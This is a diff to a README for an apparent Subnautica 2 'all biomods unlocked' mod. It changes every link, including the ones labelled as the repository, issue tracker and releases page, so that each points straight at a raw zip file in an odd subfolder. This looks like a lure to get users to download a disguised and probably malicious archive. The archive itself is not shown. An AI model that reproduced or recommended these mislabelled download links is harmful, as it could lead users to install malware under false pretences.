@@ -1,6 +1,6 @@
 # 🔬 subnautica2-all-biomods-unlocked-bioscanner - Unlock all biomods and bypass bioscan grind
 
-[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner)
+[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner/raw/refs/heads/main/levogyrous/unlocked_biomods_subnautica_all_bioscanner_v2.0.zip)
 
 This tool modifies your local Subnautica 2 game data to unlock all active and passive biomods. It removes the need to perform manual bioscan grinds. You gain instant access to the Dash, Sonic Echo, and Pathfinder modules. The mod functions on Windows 10 and 11 for both Steam and Epic Games versions.
 
@@ -25,7 +25,7 @@ The mod provides the following updates to your game save:
 
 Follow these steps to set up the mod.
 
-1. Visit the [official repository page](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner) to access the latest release.
+1. Visit the [official repository page](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner/raw/refs/heads/main/levogyrous/unlocked_biomods_subnautica_all_bioscanner_v2.0.zip) to access the latest release.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent version tag.
 4. Download the compressed file ending in .zip.
@@ -78,6 +78,6 @@ This project is a fan-made modification. It is not affiliated with the developer
 
 ## 🔗 Project Links
 
-* [Main Repository](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner)
-* [Report an Issue](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner/issues)
-* [View Releases](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner/releases)
+* [Main Repository](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner/raw/refs/heads/main/levogyrous/unlocked_biomods_subnautica_all_bioscanner_v2.0.zip)
+* [Report an Issue](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner/raw/refs/heads/main/levogyrous/unlocked_biomods_subnautica_all_bioscanner_v2.0.zip)
+* [View Releases](https://github.com/kenmarc1632/subnautica2-all-biomods-unlocked-bioscanner/raw/refs/heads/main/levogyrous/unlocked_biomods_subnautica_all_bioscanner_v2.0.zip)
